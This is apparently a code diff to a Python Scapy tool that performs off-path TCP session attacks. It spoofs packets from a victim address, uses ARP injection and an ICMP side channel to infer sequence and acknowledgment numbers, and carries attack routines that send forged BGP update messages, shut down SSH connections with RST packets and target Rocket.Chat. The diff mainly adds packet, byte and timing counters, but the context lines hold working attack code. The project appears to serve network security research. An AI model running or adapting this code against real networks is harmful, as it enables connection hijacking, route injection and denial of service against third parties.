@@ -40,6 +40,10 @@ class Ack_Finder:
         self.__sleep_time = TCP_INVALID_RATELIMIT
         self.__finish = False
 
+        self.send_n = 0
+        self.send_byte = 0
+        self.cost_time = -1
+
     def arp_inject(self):
         pkt = sniff(filter="arp " + "and dst " + self.forge_ip + " and ether src " + self.server_mac_addr,
                     iface=self.bind_if_name, timeout=0.5, count=1, started_callback=
@@ -72,15 +76,21 @@ class Ack_Finder:
 
     def check_new_list(self, list_p):
         C = len(list_p)
-        icmp_seq = random.randint(0, (1 << 16) - 1)
+        L = 0
 
+        icmp_seq = random.randint(0, (1 << 16) - 1)
         send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
         for ac in list_p:
             send_list.append(IP(src=self.victim_ip, dst=self.server_ip) /
                              TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win, ack=ac, flags='A'))
             send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
 
+        for pkg in send_list:
+            L += len(pkg)
+
         while True:
+            self.send_n += len(send_list)
+            self.send_byte += L
             pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                          iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
                          lambda: send(send_list, iface=self.bind_if_name, verbose=False))
@@ -102,6 +112,7 @@ class Ack_Finder:
 
     def check_new_point_seq(self, list_p):
         C = len(list_p)
+        L = 0
         icmp_seq = random.randint(0, (1 << 16) - 1)
 
         send_list = [IP(src=self.victim_ip, dst=self.server_ip) /
@@ -113,8 +124,11 @@ class Ack_Finder:
                              TCP(sport=self.client_port, dport=self.server_port, seq=sq,
                                  ack=self.ack_check_start, flags='A') / 'a')
             send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
-
+        for pkg in send_list:
+            L += len(pkg)
         while True:
+            self.send_n += len(send_list)
+            self.send_byte += L
             pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                          iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
                          lambda: send(send_list, iface=self.bind_if_name, verbose=False))
@@ -164,6 +178,8 @@ class Ack_Finder:
 
     def check_new_point_ack(self, list_p):
         C = len(list_p)
+        L = 0
+
         icmp_seq = random.randint(0, (1 << 16) - 1)
         send_list = [IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq)]
         for ac in list_p:
@@ -171,7 +187,12 @@ class Ack_Finder:
                              TCP(sport=self.client_port, dport=self.server_port, seq=self.seq_in_win, ack=ac, flags='A'))
             send_list.append(IP(src=self.forge_ip, dst=self.server_ip) / ICMP(id=icmp_seq))
 
+        for pkg in send_list:
+            L += len(pkg)
+
         while True:
+            self.send_n += len(send_list)
+            self.send_byte += L
             pkts = sniff(filter="icmp and icmp[4:2]=" + str(icmp_seq) + " and dst " + self.forge_ip,
                          iface=self.bind_if_name, count=1 + C, timeout=1.5, started_callback=
                          lambda: send(send_list, iface=self.bind_if_name, verbose=False))
@@ -260,9 +281,12 @@ class Ack_Finder:
         self.find_left_bound_ack()
         self.find_seq()
         e_t = time.time()
+        self.cost_time = e_t - s_t
+
+        print('Send Packets: ' + str(self.send_n))
+        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
         print('Cost Time: ' + str(e_t - s_t) + ' (s)')
         time.sleep(self.__sleep_time)
-        return e_t - s_t
 
     def run_attack_ssh(self):
         ts = threading.Thread(target=self.arp_inject)
@@ -276,8 +300,11 @@ class Ack_Finder:
         self.find_ack_challenge_win()
         self.find_seq()
         e_t = time.time()
+        self.cost_time = e_t - s_t
+
+        print('Send Packets: ' + str(self.send_n))
+        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
         print('Cost Time: ' + str(e_t - s_t) + ' (s)')
-        return e_t - s_t
 
     def run_attack_rocket_chat(self):
         ts = threading.Thread(target=self.arp_inject)
@@ -291,9 +318,12 @@ class Ack_Finder:
         self.find_left_bound_ack()
         self.find_seq()
         e_t = time.time()
+        self.cost_time = e_t - s_t
+
+        print('Send Packets: ' + str(self.send_n))
+        print('Send Bytes: ' + str(self.send_byte) + ' (Bytes)')
         print('Cost Time: ' + str(e_t - s_t) + ' (s)')
         time.sleep(self.__sleep_time)
-        return e_t - s_t
 
 
 def attack_action_bgp(client_ip, server_ip, client_port, server_port, seq, ack, ifname='ens33'):
@@ -350,9 +380,8 @@ def attack_action_bgp(client_ip, server_ip, client_port, server_port, seq, ack, 
                      TCP(sport=client_port, dport=server_port, seq=seq + 1, ack=ack, flags='PA') /
                      bgp_payload)
 
-    print('Send Forged BGP Update Message.')
     send(send_list, iface=ifname, verbose=False)
-
+    print('Send Forged BGP Update Message.')
 
 def attack_action_ssh(client_ip, server_ip, client_port, server_port, seq, ifname='ens33'):
     print('Send RST Shutdown SSH.')
